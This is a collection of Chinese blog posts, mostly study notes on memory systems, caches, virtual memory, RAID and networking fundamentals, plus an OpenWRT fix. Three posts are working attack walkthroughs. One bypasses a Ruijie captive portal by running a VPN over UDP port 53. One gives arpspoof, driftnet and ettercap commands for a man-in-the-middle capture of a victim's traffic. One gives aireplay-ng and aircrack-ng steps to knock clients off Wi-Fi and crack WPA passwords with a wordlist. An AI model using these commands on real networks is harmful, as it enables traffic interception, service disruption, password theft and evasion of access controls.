CPU中的寄存器一般使用触发器实现。它集成度最低，容量最小，但是速度也最快。Cache使用SRAM实现，MM使用DRAM实现，BIOS使用ROM实现，辅存使用HDD实现，还有其他脱机存储器，比如磁带，光盘等。 现在，CPU内部的Cache也有多级缓存结构，例如L1 Cache，L2 Cache，L3 Cache。 系统的总线分为北桥和南桥，前者速度比较快，跟CPU相连更近；后者离CPU更远，因此更慢。不过现在南北桥已经集成到SoC（System on Chip）了，两个已经合成一个芯片。 一般存储体系有两种： Cache存储体系 由Cache和主存构成，主要为了提高存储器速度；对系统程序员以上均透明（不可见） 虚拟存储器系统 由主存和磁盘构成，主要是为了扩大容量；对应用程序员透明 透明的说法在这些计算机的书里很流行，它的意思不是说可见，而是说它本身和一块玻璃一样，不可被看见。 存储器分类分类标准：介质、用途、信息易失性、存取方式（随机，例如RAM；顺序访问，例如顺序存取存储器SAM，直接存取存储器DAM）、读写功能（读写，只读）。 也可以如下分类： 基本型存储器 半导体 易失RAM S(Static)RAM D(Dynamic)RAM 非易失ROM EPROM紫外线擦除 EEPROM($E^2ROM$)电擦除 Flash闪速 NOR随机访问，可存储固件 NAND只能顺序存储，可以做大容量存储器 磁：磁盘 复合型存储器 半导体：多端口、多体交叉、相联 磁：磁盘阵列（RAID） 4.1.2.存储器的性能指标容量、速度（存取时间；存取周期；存储器带宽，单位时间存储器可以读出/写入的字节数，$B_m=\\frac{n}{t_m}$，分子是每次读写字节数，分母是存取周期）、可靠性、功耗、价格、体积、重量、封装方式、工作电压、环境条件等。 4.2.1.随机读写存储器RAM 内部译码结构： 一维译码：使用类似74138的译码器将地址对应到存储单元 二维译码：一个行选，一个列选，适合大规模存储器的译码 单元电路 静态读写存储器SRAM 由6个晶体管实现，只要不断电，信息不丢失。初始加电，状态随机。电路中总有晶体管导通，功耗大，集成度不高。 2. 动态读写存储器DRAM 四个晶体管实现。内部由电容维持电荷，因此需要定时读取刷新来保持数据。功耗低，集成度高。现在更新的DRAM可以只用一个晶体管和一个电容来实现，因此可以有更高的集成度。通过SenseAMP，可以根据电压变化来刷新存储器的内容。 3. 内存构成 1. 单片存储器芯片的连接 引脚定义：Dn是数据线，An是地址线，OE是读开关，WE是写开关，CS是控制开关，也就是片选端口。 连接方式如图所示，特殊的部分主要集中在片选端口上。这部分电路叫做内存地址译码电路，它负责选择不同的芯片。注意，上划线的是低电平有效端口。 这里的重点就是地址范围分析。这个很简单，只需要让CS为低电平的信号作为高位，再去看低12位的地址总线就能看出来地址范围了。比如，下图的地址范围就是F0000H~F1FFFH这个地址范围。 2. 内存的字扩展 使用$8K*8bit$的SRAM去构成32KB的内存，只需要让二者的位数对应上就行。比如这里就只需要4个这种规格的SRAM芯片。如下所示： 所有芯片的Dn和An、OE、WE都并联。而CS则由74138控制片选情况。这时就可以分析得到，从上到下四个芯片的地址范围分别是C0000C1FFF，C2000C3FFF，C4000C5FFF，C6000C7FFF。这称为字扩展。 3. 内存的位扩展 例如，用$2K4bit$的存储芯片构成$2K8bit$的存储芯片。这种接法如下图所示： 也是用74138去进行片选，同时BHE也需要控制。 这里经常会有内存范围的计算。计算地址范围的大小时，记得大地址减去小地址后加一。例如78000H到97FFFH，计算时就应该是用$98000H-78000H=20000H$，也就是$2^{17}$字节（一般都是按字节编址），因此需要$(2^{17}\\div 2^{10})KB\\div 2KB=64$片这样的芯片。 可以参考这个例题食用： 4.2.2.只读存储器ROM 特点：存储信息的非易失性 分类： 掩膜型ROM 可编程ROM：PROM、OTP-ROM 可擦写编程ROM：（UV）EPROM、EEPROM、Flash（NOR、NAND） 4.2.3.动态存储器 一般的动态存储器DRAM：以Intel 2164A为例 无论读写，地址都需要分两次来送。第一次时，给RAS一个下降沿，第二次，给CAS一个下降沿，来让芯片读取这两个地址。得到地址之后，芯片把数据送出数据线。这和如今的DRAM芯片一致。它每隔2ms刷新一次。只需要给RAS一个下降沿，就能刷新一行的DRAM。 这里可能会考到引脚相关的问题，如下所示： 常用刷新方式： 集中式：有概率会遇到死区（不可用时段），因为刷新时间会集中占用一个时段 分布式：更短的刷新周期，将刷新的周期均匀分布到读取时间段。但是内存访问时延变长了 异步式（最常用）：$Row\\div T_{Refresh}$得到周期，再在每个周期最后刷新内存。它将刷新安排在指令译码阶段，不会出现死区。 同步动态存储器SDRAM DDR SDRAM：上升和下降沿都能读写数据。 4.2.5.其他存储器 多端口存储器：DS1609，有两个数据端 多体交叉存储器：并行，提高读写性能 多体并行访问：80x86处理器内存组织 多体交叉访问：类似流水线的重复设置瓶颈段的操作，能大大提高性能。连续读m个数据，需要的时间：$T+(m-1)\\cdot \\Delta t$。类比于流水线的加速比，它也有加速比，$B=\\frac{1-(1-\\lambda)^m}{\\lambda}$。标量机中，m取2~8；超量机中，主存分体数可以超过32 相联存储器：一种多路选择器构成的Key-Value形式存储器 它的用途有：Cache的目录表、页表的块表（TLB）等。 4.3.高速缓冲存储器它是实现金字塔型存储体系的关键所在。它可以将上一部分频繁使用的部分存放在其中，以此来提高性能（这是因为它本身的速度就很快）。 局部性原理：时间/空间局部性，相关的变量，会在时间/空间上存在局部性比如循环变量，会存在时间局部性；相邻的数组元素，存在空间局部性 上面是Cache的作用：命中的话，直接使用；未命中Cache，则访问主存，并改动Cache。这一步得注意，由于Cache存在，就出现了数据不一致性，因此得控制好数据写回时机来保证数据一致性。 4.3.2.地址映射 地址映像 就是把主存上的数据按照某种规则装入Cache，并建立主存和Cache地址间的映射。 地址变换 使用Cache中数据之前，必须先把程序从主存地址变换成Cache地址才能使用。 选取地址映射的原则： 地址变换硬件要高速、低价、易于实现 Cache空间利用率要高 发生块冲突概率要小 这种映射的调度单位是块。 映射方式一般有三种：全相联、直接映射、组相联。 全相联：主存的任意一块可以映像到Cache的任意一块（可以认为是完全自由的装法）。具体如下图所示： 直接映射：按照Cache容量对主存分区，一个区的块只能装入一个Cache的对应位置。不过这里得注意，目录不存块号了，存的是区号。块号在Cache开头存着。 这样的好处就是，不用相联存储器，访问速度也快（不需要地址变换）。不过缺点也很明显：Cache块利用率低，块冲突概率高。特别是，如果主存存储的变量具有空间相关性（比如数组），那这一个Cache位置几乎每次访问都不会命中了。 组相联：跟上面一样，将主存按Cache总大小分区，每个区内部按照Cache规则分组，每个组中有若干块。具体如下图： 它是前两者的折中，优点是提高了利用率，降低了冲突率，也大幅降低了失效比率。但是问题是制造成本和难度上升了。 做题时，要解决Cache分块，只需要把主存地址按照每个编号类型的长度来划分就行。 4.3.3.替换算法直接映射不需要替换算法。全相联、组相联有如下几种替换算法： 随机替换算法 先进先出替换算法（FIFO） 它还有一个二次机会的版本 最不经常使用替换算法（LFU）：总的使用频次最少，实现困难 近期最少使用替换算法（LRU）：上一次使用的时间点最晚 最佳替换算法（OPT）：预测将来的情况，根据将来的情况替换。作为其他算法的性能基准 关于一致性问题有两种策略：写回法，只有Cache被替换时才将它写回；全写/写直达法，写入Cache时顺便写入主存，如果未命中，则直接写主存，然后根据WTWA/WTNWA（写分配/不分配法）来决定是否将块取到Cache。前一种方法高性能，后一种主存一致性好。 4.3.5.Cache性能分析 加速比 Cache-主存系统的平均访问时间（周期）$T_A$： $T_A=H\\times T_C + (1-H)\\times T_M$ $T_A=H\\times T_C + (1-H)\\times(T_B+T_C)=T_C+(1-H)\\times T_B$ 其中，$T_C$和$T_M$分别是Cache和主存的访问周期，数据块装入Cache的时间是$T_B$，Cache的命中率为$H$。当命中率很高时，$T_A \\to T_C$。 上面的两个等式，对应的分别是1，2两种情况。第二个式子的考量就是，如果没有命中缓存，则耗时为缓存装入时间加上缓存访问时间。 例如，假设$H=95%,T_M=100ns,T_C=10ns$，则可得$T_A=14.5ns,S_P=6.9$。其中的$S_P$就是加速比，定义为$S_P=\\frac{T_M}{T_A}$。 成本 $C=(C_1\\times S_1+C_2\\times S_2)/(S_1+S_2)$，也就是主存价格*主存容量+缓存价格*缓存容量 命中率与Cache容量的关系：$H=1-S^{-0.5}$ 这给出了Cache容量的合理考虑区间。 命中率与块大小的关系 两级Cache 未命中率（失效率）：$\\text{总失效率}=\\text{失效率}_\\text{第一级} \\times \\text{失效率}_\\text{第二级}$ 4.4.虚拟存储器高速的主存容量不能满足要求，因此开发出了虚拟存储器（软件实现）。 CPU集成的：Cache，MMU等。这些为主存的实现提供了基础。 虚拟存储器=主存储器+外部存储器+辅助硬件（MMU）+系统软件（OS）。而虚拟地址得先转换成指向真实物理内存的物理地址才能拿来使用（地址转换）。 地址映像：全相联；地址变换：MMU。虚拟存储器相当于内存扩展的一种实现手段，通过将内存映像到磁盘上，模仿Cache的原理，以此扩大主存容量。 这其中涉及三种地址空间： 虚拟地址空间：编程中用到的 主存储器地址空间：物理地址 辅助地址空间：磁盘存储器的地址 因地址映像和变换方法不同，存储方式分为段式存储、页式存储、段页式存储。 段式存储：每个程序段从0开始编址，长度不定。如下图，把数据分段，再把数据装入内存。对于不常用的段，系统会把它放入磁盘。 缺点有俩。一个是太慢了。因为得做两次运算；另一个是，页表太大了。 页式虚拟存储器：跟上面一样，分页，页大小固定。 它的缺点很明显。当地址空间过大时，它的体积会很大。为了解决这个问题，出现了多级页表。 段页式存储器：先分段，每个段再分页。这需要段表和页表，它们都由操作系统管理。 由于页表本身很大，因此引入了一个CPU内部的Cache用来存储TLB，而慢表存储在主存中。虚拟地址和Cache地址一样，也是把物理地址转化来得到的。每一个段的大小是4KB，页则是由若干个段构成。段有额外的位用于标记读写执行情况。段内有偏移，页内也有偏移。 注意：页/段页都是以页为基础单位来和磁盘交换数据的，只有段式是以段为单位和磁盘交换的。 页表级数为i，则$\\frac{2^P}{B_e}^i=2^V$，简化得： $$i=\\frac{log_2 2^V}{log_2 2^P-log_2 B^e}=\\frac{V}{P-log_2 B^e}=\\frac{V}{P-N_e}$$ 其中，$V$是虚页号的位数，$P$是页内偏移的位数，$N_e$是页表每一项需要几位编址。 4.5.外存储器磁盘特点： 优点：存储容量大，单位价格低、记录介质可重复使用、可长期脱机保存、非破坏性读出 缺点：存取速度慢、机械结构复杂、工作环境要求高 磁记录原理 写入：磁头通不同方向的电流，就能在磁化材料上留下不同方向的磁场。 读取：原来是磁头切割磁感线，电流方向就是信息。现在是GMR效应，读取使用单独的头，能实现更高的容量。从LMR到垂直记录技术（PMR）的改进也大幅提高了磁盘容量。 记录方式，和计算机网络中的编码是相似的，有RZ，NRZ，NRZ1，FM，MFM，PM等： 这是磁盘的结构，一般民用磁盘大气压和外界一样的，高速旋转时，会在表面形成气垫，托起磁头。 硬盘的数据记录格式 磁盘内部物理地址 柱面 Cylinder 记录区 Head 扇区 Sector 结构方面，单个面分为一个一个的环，称为磁道（Tracks）。几个盘面上的同位置的磁道组合起来称为一个柱面（Cyinder）。磁盘上一个扇形区域称为一个扇区（Sectors）。 主要技术指标 道密度：道/mm，道/英寸 位密度：bit/mm，bit/英寸 存储容量 非格式化容量=位密度x内圈磁道周长x每个记录面的磁道数x记录面数 格式化容量=每个扇区的字节数x每道扇区数x每个记录面磁道数x记录面数 存储容量如上，有两种。早期为方便管理，将所有磁道等分为相同的扇区数。磁道外圈可靠性最高（因为外圈的词单元尺寸最大，所以最可靠），从外圈开始编号。 平均访问时间：平均寻道时间+平均等待时间（转半圈的速度）+数据传输时间，是毫秒级别的参数。 转速：RPM（转/分钟） 数据传输速率：磁头找到数据地址后，单位时间读/写的字节数。计算方法为：$\\text{每个扇区的字节数}\\times\\text{每道扇区数}\\times\\text{磁盘转速}$ 上面是2001年生产的硬盘参数，能从参数看出磁盘对加工精度的极高要求。下面是一个硬盘容量计算的例题。 受限于磁盘的物理原理，磁盘的随机访问性能相对比较差。因此，引入了磁盘阵列RAID。 4.5.1.磁盘阵列RAID 这部分内容了解就行（不了解也行 作用就是通过设置重复设备，来提高整体的性能和可靠性。详细可以看这本书： RAID全称呼：独立冗余磁盘阵列（Redundant Array of Independent Disks）。不过刚开始I表示的是Inexpensive，廉价。 RAID0：无冗余 性能高，但是可靠性不高。并且需要至少两块硬盘。 RAID1：两块盘互为镜像 RAID0+1/RAID01 RAID1+0/RAID10 RAID2：冗余使用汉明码 RAID3：位交错奇偶校验 不能并发读写 RAID4：块级奇偶校验 可以并发读取，不过不能并发写入。 RAID5 RAID6 4.6.Cache一致性协议 了解就行","link":"/2023/05/31/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/%E8%AE%A1%E7%BB%84%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E5%9B%9B%E7%AB%A0-%E5%AD%98%E5%82%A8%E7%B3%BB%E7%BB%9F/"},{"title":"OpenWRT折腾笔记","text":"疑难杂症OpenWRT拨号失败今天换了OpenWRT，在WAN端口设置拨号后发现拨号失败，报错为USER_REQUEST。试了下这个解决方案：强制给端口指定MAC地址之后，发现拨号成功了。。 具体操作：网络管理端启用ssh，通过ssh连接路由器后，执行下面的指令： 1vi /etc/config/network 然后，在config interface 'wan'块的下面添加一行指派MAC地址： 1option macaddr 'a0:23:36:a8:8d:9e' 然后重启WAN端口，发现拨号成功。","link":"/2024/06/30/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/OpenWRT%E6%8A%98%E8%85%BE%E7%AC%94%E8%AE%B0/"},{"title":"UDP53端口绕过Wi-Fi登陆认证","text":"这段时间一直在和锐捷对线，甚至被迫营业用上kali nh（本就不大的存储空间更加雪上加霜www）不过好在找到了法子。 就是它！UDP 53!搬一下度娘介绍： 53端口为DNS(Domain Name Server，域名服务器)服务器所开放，主要用于域名解析，DNS服务在NT系统中使用的最为广泛。通过DNS服务器可以实现域名与IP地址之间的转换，只要记住域名就可以快速访问网站。 就是这样！但是这和我不能认证上网又有什么关系呢？有关系。因为锐捷会劫持你的页面，但是它对UDP53端口是不拦截的。所以……或许可以试试借此突破防护？ 我们试试连接wifi，ping一下百度（百度正确食用方法：测试网络状况） 我们得到了下图的结果： 也就是说，我们可以通过UDP53端口来直接访问外部网络！ 验证结束。接下来开始实操。 首先，我们需要两个文件。一个是服务端软件openVPN server，另一个是服务端远程管理软件SoftEther VPN。除此之外，还需要一个有公网地址的服务器。我用的是运行Ubuntu的阿里云（毕竟学生机跟白送差不多×），也有dalao用的是vultr之类的。 首先，我们需要配置我们的服务端。通过ssh连接到ubuntu服务器，创建一个目录用来下载openvpn的安装文件。 下载完成之后，使用命令tar -zxvf [文件名]来解压。解压完成后使用cd openvpn进入软件目录，使用make命令来编译软件（默认环境已经安装了gcc等支持）。编译过程一路1+回车确定即可。 编译完成后使用命令./vpnserver start启动服务端，使用命令./vpncmd进入设置。输入1后连按回车直到出现vpnserver&gt;提示符为止。使用SetVpnserverPassword指令设置openvpn服务端密码。设置完成后，使用exit指令退出。 至此，服务端配置完成。可以断开ssh连接了。 现在，我们需要一个运行windows系统的电脑（废话）来完成服务端的最终配置。 这里的配置后面再说，我先放上已经完成的配置文件：openVPN配置文件 点击下载到本地，待会需要使用到这个文件 接下来，我们便可以使用openvpn来愉快地上网了（不过ios平台可能得费些功夫，因为在国内这玩意下载起来比较困难） 这里先附上安卓端：点击下载。 下载完成后，打开软件，点击右上角导入配置文件。然后找到我们刚下载好的配置文件，打开，确定，点击开启，输入账号密码，完成！ 到这里就差不多结束了。现在，你可以无视锐捷，愉快地免登陆上网了w","link":"/2020/12/18/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/UDP53%E7%AB%AF%E5%8F%A3%E7%BB%95%E8%BF%87Wi-Fi%E7%99%BB%E9%99%86%E8%AE%A4%E8%AF%81/"},{"title":"使用Kali进行ARP欺骗攻击","text":"步骤先用ifconfig看网卡名称，我是eth0。随后用fping或者nmap扫描网段 1234fping -asg 192.168.16.0/24# 或者这条nmap 192.168.16.1-100arpspoof -i eth0 -t [target IP] [gate] 如果想做中间人攻击，编辑/etc/sysctl.conf，添加配置net.ipv4.ip_forward=1，就可以开启端口转发。 此时重新运行，不过得换一下网关ip和目标ip 1arpspoof -i eth0 -t [gate] [target IP] 随后打开另一个终端，运行driftnet和ettercap： 12driftnet -i eth0 -a -d /root/outettercap -Tq -i eth0 在上面的目录可以看到缓存的图片，下面的终端可以看到eth0的流量。至此，攻击测试完成。","link":"/2023/05/22/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/arp-kali/"},{"title":"基于Kali的WiFi攻击","text":"仅限于合法用途，责任自负Legal purpose only, do it at your own risk. 准备 检查网卡情况 在终端输入 ifconfig , 如果看到 wlan0 , 就进行下一步。 启动监控模式 用下面的命令启动设备： 1arimon-ng start wlan0 然后在ifconfig的输出中，你就能看到名叫wlan0mon的设备。然后输入 1airodump-ng wlan0mon 来启动监听。用下面的指令停止监听： 1airmon-ng stop wlan0mon 断网攻击扫出来目标设备之后，用ctrl+c停止扫描，然后再开个终端，输入 1aireplay-ng -0 0 -a [BSSID] wlan0mon 然后回来这个终端，输入 1airodump-ng -c [CH] --bssid [BSSID] -w ~/ wlan0mon 然后连接那个路由器WiFi的设备应该就会断联了。 破解密码当你捕捉到这样的握手包 WPA handshake: [PACKAGE]时， Ctrl+c停止指令 然后输入 1aircrack-ng -a2 -b [PACKAGE] -w [PATH-TO-PASS-DICTIONARY] ~/*.cap Kali的自带字典一般在这： /fs/usr/share/wordlists/rockyou.txt.gz. 解压，然后把rockyou.txt的路径替换到上边，回车。然后应该就能获取到密码了。","link":"/2023/01/28/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E5%9F%BA%E4%BA%8EKali%E7%9A%84WiFi%E6%94%BB%E5%87%BB/"},{"title":"计网笔记：复习","text":"Chap.1.概述 数据通信的概念及模型：报文、接收方、传输协议等 数据流 计算机网络的概念 网络的三个准则 链路的概念 拓扑结构：网状、星形、主干形 网络模型的概念 网络分类 因特网的历史：前身-ARPANET 协议的概念和三个要素：p13，语法（数据结构）、语义和时序 Chap.2.网络模型 分层的概念 OSI模型概念和各层功能 TCP/IP协议簇和各层功能 地址：物理/逻辑/端口地址 Chap.3.物理层 数字信号： 传输减损： 数据速率限制：乃亏斯特定理、香浓容量定理 性能：带宽、吞吐量、延迟、传播时间、传输时间、排队时间、带宽与延迟的乘积和概念 Chap.4.数字传输 线路编码 线路编码方案（重要）：NRZ、NRZ-L/I、RZ、双相码、双极性编码。这里的差分编码根据初始值不同，可能有两个答案 块编码 扰码 脉码调制PCM：采样（采样率&gt;=2倍最高频率）、量化等级、简化误差 Chap.5.模拟传输 了解基本概念和原理即可。 Chap.6.带宽利用 复用：FDM、同步/统计TDM（了解）、WDM 数字层次、T1载波（速率1.44MiB）、E1载波（2.048MiB） Chap.7.传输介质 导向介质：双绞线（电信号，易受干扰）、同轴电缆、光纤（抗干扰能力最强） 无线传输介质 Chap.8.交换 电路交换特点 数据报交换特点 虚电路交换特点 Chap.9.过Chap.10.检错和纠错 纠错的概念和方法 循环冗余编码CRC（重要）（不包含硬件实现、注意除数的长度）、CRC的检错能力分析（检测单个位差错、两个独立位差错、奇数个差错、突发性差错） 校验和及其计算方法 Chap.11.数据链路层 停止等待ARQ、后退N帧ARQ和选择重发ARQ、窗口、最大链路利用率 HDLC PPP协议 Chap.12.多路访问 随机访问：纯ALOHA、时隙ALOHA、CSMA、CSMA/CD、CSMA/CA、最小帧长、传播时长 Chap.13-14.有线/无线局域网 标准以太网的MAC子层：帧格式、MAC地址、最短帧长等 802.11MAC子层、帧结构 Chap.15.连接局域网、主干网和虚拟局域网 连接设备：透明网桥、二层交换机（它没有IP地址）、路由器、无源集线器、中继器、有源集线器、网桥、生成树、三层交换机 虚拟局域网的概念及划分方法 Chap.19.逻辑寻址（重要） IPV4地址：ABCDE类地址 掩码、子网和超网的概念 子网划分 无类别域间路由CIDR Chap.20.IP协议字段有啥大概也记一下 IP分组（数据报的格式） 分片与MTU（以太网最大是1500） IPV4校验和 IPV6分组格式、零压缩规则 IPV4和IPV6混合 Chap.21.地址映射、差错报告和多播 ARP概念、分组格式、封装、四种操作 DHCP概念 ICMP（重点）：概念、报文格式、差错报告（5种） IGMP的基本概念 Chap.22.传递、转发、路由选择 转发技术、转发过程 路由表、地址聚合、最长掩码匹配 路由算法（重点）：Dijkstra（很重要）、Bellman Ford算法（重要） 单播路由协议：AS概念、RIP协议（基于距离向量）、OSPF协议（基于状态向量） 多播的概念和多播路由（了解） Chap.23.UDP、TCP、SCTP 端口、套接字 UDP：概念、结构、校验和、操作 TCP：特点、服务、文段格式 TCP连接建立和拆除 学会画连接过程图：注意标注清楚seq,ack等字段 TCP流量控制（信贷划窗协议） TCP差错控制：主要是重传（超时/快速） Chap.24.拥塞控制和服务质量 TCP拥塞控制 服务质量 Chap.25-27.应用层 FTP端口用两个端口20和21，一个用来传数据，一个用来传控制信息。 电子邮件协议：SMTP、MIME、POP3、IMAP等 Telnet HTTP、DNS等、Cookies、URL等","link":"/2023/06/07/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0%EF%BC%9A%E5%A4%8D%E4%B9%A0/"},{"title":"计网笔记：第一部分-概述","text":"Chap.1.绪论数据通信数据是任何格式表示的信息，数据通信是两台设备间通过介质进行数据交换。效率取决于： 传递性：目的地正确 准确性：数据正确 及时性：时延可接受 抖动性：各部分到达时延不相同 组成 报文 发送方 接收方 传输介质 协议 信息表示二进制/文本编码 数据流 单工：数据流向是单向的，比如键盘等输入设备就是单工连接 半双工：同时只能有一个方向的数据流动，无线电设备有的就是这样 全双工：双向车道，同时可以有两个方向的数据流过，比如网线等 网络分布式处理网络准则 性能 可靠性 安全性 物理结构 连接类型 点到点 多点连接 物理拓扑结构 网状：拥有最高的稳定性 星形 总线 环状 混合型 网络模型当今为止最著名的就是OSI模型和因特网模型。 网络分类 局域网-LAN 广域网-WAN 城域网-MAN 因特网历史之类的，太长不看。因特网前身是ARPANET。 协议和标准协议，就是规则。标准是协商达成一致的规则。 协议它规定了通信的内容、通信的方式和通信的时间。它的核心要素是语法、语义和时序。 语法：数据的结构或格式 语义：每一个片段或位的含义 时序：报文发送的时间和发送的速率 标准分为事实标准和法定标准。 Chap.2.网络模型OSI模型从上到下一共有7层 应用层：使得用户（人或软件）可以访问网络，它负责向应用提供服务 具体的服务有：网络虚拟终端（ssh等），文件传输、访问和管理，邮件服务、目录服务 表示层：翻译、加密和压缩数据 会话层：对话控制（建立、管理和终止）和同步 传输层：一个报文从一个进程到另一个进程的传递 端到端的可靠报文传递，以及差错控制 它负责服务点寻址、分段和组装、连接控制、流量控制、差错控制 网络层：将各个分组从源地址传送到目的地址 IP协议是不可靠的传输协议 它负责逻辑寻址和路由选择 数据链路层：帧从一跳到下一跳（在节点间）的传递 它有差错控制，流量控制和访问控制，也负责位流的成帧，同时也负责物理寻址 物理层：位从一个节点到另一个节点的传递 OSI中，只有数据链路层和传输层提供流量控制和差错控制。 TCP/IP协议族分为5层，可以是看作简化了OSI的应用层的协议。 结构和使用的协议如上图所示。 网络层它使用网际协议Internet Protocol。而IP使用四个协议: ARP地址解析协议：将逻辑地址和物理地址关联起来 RARP：逆向ARP。用于从物理地址得到逻辑地址 ICMP：因特网控制报文协议，主机和网关使用的机制，用来向发送方通知数据报发生的问题 IGMP：因特网组报文协议，将一个报文同时发送给一组接收者 传输层主要有UDP、TCP和SCTP三个协议。其中UDP是无连接的不可靠协议，TCP是面向连接的可靠协议。SCTP则综合了前两者的优点，比较新。 应用层相当于OSI的会话层+表示层+应用层，定义了许多协议，比如SMTP，FTP，HTTP（S），DNS，SNMP，TELNET等。 寻址TCP/IP采用四层地址：物理链路地址、逻辑地址IP、端口地址和专用地址。它们分别和物理层+数据链路层、网络层、传输层、应用层相关联。 物理地址也是链路地址，是网络中的节点地址，标识在网络接口卡（NIC）上。MAC地址一般使用48位（二进制数）地址表示 逻辑地址目前在用IPv4。它唯一定义了连接在因特网上的一台主机。跳到跳传输时，物理地址会改变，但是逻辑地址保持不变。 端口地址一般用来标识一个主机上的一个唯一的进程。端口号由IANA规定。 专用地址面向用户。比如URL就是专用地址，再比如电子邮件的地址也是专用地址。 上面就是概述部分的内容了。","link":"/2023/06/09/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%A7%91%E5%AD%A6/%E8%AE%A1%E7%AE%97%E6%9C%BA%E7%BD%91%E7%BB%9C/%E8%AE%A1%E7%BD%91%E7%AC%94%E8%AE%B0%EF%BC%9A%E7%AC%AC%E4%B8%80%E9%83%A8%E5%88%86-%E6%A6%82%E8%BF%B0/"},{"title":"计网笔记：第三部分-数据链路层","text":"Chap.10.检错与纠错 差错类型：单个位差错（1bit）、突发性差错（&gt;1bit） 纠错方式：向前纠错（根据冗余推测报文）/重传（要求发送方重新发送） 编码 分类 块编码、卷积编码 汉明距离 两个二进制数不同数位的数量，比如001和011的汉明距离是1。 最小汉明距离$d_{min}$ 一组码字中所有组合的汉明距离的最小值 块编码总长度：n=k+r，k是数据字的长度，r是冗余位长度。即有$2^k$个数据字组合，$2^n$个码字组合，$2^n-2^k$个未使用码字 模运算 模2运算和异或一致。 差错检测条件 接收方有有效码字表，并且原来的码字为无效码字 纠错 将数据和编码表对照，找出汉明距离最小的码字作为结果 编码方案表示 需要三个参数：$n,k,d_{min}$。编码方案C可记作$C(n,k),d_{min}=d_0$ 检错最小距离 $s\\leq d_{min} -1$ 纠错最小距离 $d_{min}=2t+1$，基于码字离有效码字的汉明距离 线性块编码正式定义需要抽象代数 任意两个有效码字生成另一个有效码字 $d_{min}$：具有最小1的个数的非0有效码字中1的个数 简单奇偶校验编码简单奇偶校验编码是一种最简单、最常用的校验码，用来检测数据传输过程中是否发生错误。它的基本方法是：在n位有效信息位上增加一个二进制位作为校验位P，构成n+1位的奇偶校验码。它有两种校验方法：奇校验和偶校验。 奇校验：使n+1位的奇偶校验码中1的个数为奇数。 偶校验：使n+1位的奇偶校验码中1的个数为偶数。 它的检错能力是：可以检出1位错或奇数位错，无纠错能力。它的一个常见的应用场合是ASCII码，ASCII码占用一个字节，低7位是有效位，最高位用作奇偶校验。 汉明编码汉明编码是一种线性纠错码，它具有一位纠错能力。它的基本方法是：在n位有效信息位上增加k位校验位，构成n+k位的汉明编码。 校验位的位置：第1、2、4、8、…、2^(k-1)位，其余位置是数据位。 校验位的取值：使每个校验位所覆盖的数据位和校验位本身中1的个数为奇数或偶数。 纠错过程：对传送后的汉明编码形成新的校验位，根据新校验位的状态，便可直接指出错误的位置。 循环编码循环编码是一种线性分组码，满足循环特性，即任意码字的循环移位仍然是该编码中的一个码字。循环编码可以用多项式表示法，即将每个码字看作一个多项式的系数向量，例如(1100101)对应于x^6+x^5+x^2+1。 循环编码可以用模运算来进行编码和译码，即将多项式除以一个n次多项式N(x)，得到商式和余式，其中余式就是循环码的一个码字。 循环编码有一个生成多项式g(x)，它是N(x)的一个首1因子，且常数项不为0，它决定了循环码的结构和性质。 循环编码有一个校验多项式h(x)，它是N(x)除以g(x)得到的商式，它可以用来检测和纠正传输过程中的错误。 循环冗余校验-CRC循环冗余校验-CRC是一种数据通信领域常用的一种数据传输检错技术，它通过在发送端对数据按照某种多项式算法计算出校验码，并将得到的校验码附在数据帧的后面，一起发送到接收端。接收端对收到的数据和校验码按照相同的多项式算法进行验证，以此判断接收到的数据是否正确、完整。如果没有余数，说明数据没有出错，否则说明有错误。 CRC的计算方法有多种，不同的方法有不同的生成多项式、初始值、结果异或值、输入输出反转等参数，这些参数决定了CRC的检错能力和效率。 CRC的优点是计算简单、速度快、占用资源少，能够检测出大部分随机错误和突发错误，缺点是无法检测出所有的错误，比如两个位同时发生错误并互换位置等。 CRC计算方法就是模2除法。首先根据生成多项式位数-1来在要处理的数据后边补同等数量的0，然后再用它除以生成多项式，除时不借位，直接异或运算得到商和余数。此时，要发送的数据就是商和余数了。接收方得到数据后，进行同样的操作（补0，模2除法），如果没有余数，则说明数据完好无损，否则数据有差错。 生成多项式，是一个N次多项式。比如，$X^4+X+1$。它对应的二进制表示的生成多项式就是$10011$，因为四次项、一次项和零次项系数非零。 校验和-Checksum它将被校验的数据按位或按字节进行累加，并舍弃累加溢出的位，得到一个或多个字节的结果。它可以用来检测数据在传输或存储过程中是否发生错误，通常将校验和附加在数据后面，接收方可以通过重新计算校验和并与原始校验和比较来判断数据是否完整。 校验和的计算方法有多种，例如按位异或、按字节累加、按多项式除法等，不同的方法有不同的效率和准确性。 校验和的优点是计算简单、速度快、占用资源少，缺点是无法检测出多个字节同时发生错误的情况，比如两个字节的值互换或相反。 Chap.11.数据链路控制数据链路层功能： 数据链控制：成帧，流量、差错控制，节点间帧传输可靠协议 成帧将位组合成帧，并添加首尾使其和其他帧区分开。成帧有两种协议：面向字符协议和面向位协议。它们的区别主要是转义符添加的方案。前者添加一个ESC字节，后者遇到011111就添加一个0来转义。 帧结构是：标记+头部+转义后数据+尾部+标记 Fixed-Size Framing 固定长度成帧 例如第18章的ATM信元 Variable-Size Framing 可变长度成帧 面向字符和面向比特位 流量控制和差错控制也叫数据链路控制功能。 